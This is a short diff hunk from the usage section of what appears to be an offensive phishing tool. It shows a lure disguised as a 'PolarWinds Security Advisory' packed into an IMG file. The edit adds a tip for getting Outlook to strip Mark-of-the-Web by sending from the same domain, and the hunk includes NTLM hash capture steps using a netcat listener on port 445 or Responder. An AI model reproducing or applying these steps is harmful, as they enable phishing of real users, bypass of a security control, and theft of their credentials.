@@ -36,7 +36,7 @@ USAGE
       --lure-title "PolarWinds Security Advisory 2026-Q1" \
       --iso-name "PolarWinds-Advisory.img"
 
-  # Step 3: Serve / email NV.html to r.mcdonald@polar.local
+  # Step 3: Serve / email NV.html to {target@domain.com} - sending from same domain will let Outlook strip MOTW.
   # NTLM capture: nc -lvnp 445 or Responder on Kali tun0
 
 PRIMARY SOURCES
